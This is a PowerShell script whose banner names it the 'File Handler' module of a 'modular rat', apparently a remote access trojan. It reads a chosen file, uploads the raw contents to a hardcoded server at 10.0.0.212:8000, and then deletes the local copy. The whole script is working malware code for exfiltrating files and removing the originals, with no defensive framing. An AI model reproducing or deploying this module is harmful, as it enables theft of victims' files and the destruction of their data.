$file_name = If ($args[0]) { $args[0] }else { Write-Error "Please specify the file name..." }

function title {
   Write-Host "
    _ __ ___   ___   __| |_   _| | __ _ _ __   _ __ __ _| |_
   | '_ ` _ \ / _ \ / _` | | | | |/ _` | '__| | '__/ _` | __|
   | | | | | | (_) | (_| | |_| | | (_| | |    | | | (_| | |_
   |_| |_| |_|\___/ \__,_|\__,_|_|\__,_|_|    |_|  \__,_|\__|
   " -ForegroundColor DarkGray
   Write-Host "
                       Module : File Handler
   " -ForegroundColor Blue
   Write-Host "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" -ForegroundColor DarkGray
   Write-Host ""
}


function upload($file_location) {
   $uri = "http://10.0.0.212:8000/upload"
   $contentType = "multipart/form-data"
   $headers=New-Object "System.Collections.Generic.Dictionary[[String], [String]]"
   $headers.Add("Content-Type", $contentType)
   $body = @{
      "files" = Get-Content("$file_location") -Raw
   }
   Invoke-WebRequest -Uri $uri -Method Post -Headers $headers -ContentType $contentType -Body $body
}

function run() {
   title
   try {
      $location = Get-Item "$file_name" -ErrorAction Stop
      upload($location)
      Remove-Item "$location"
   }
   catch {
      Write-Host "Error while trying to upload file" -ForegroundColor Red
      exit 
   }
}

run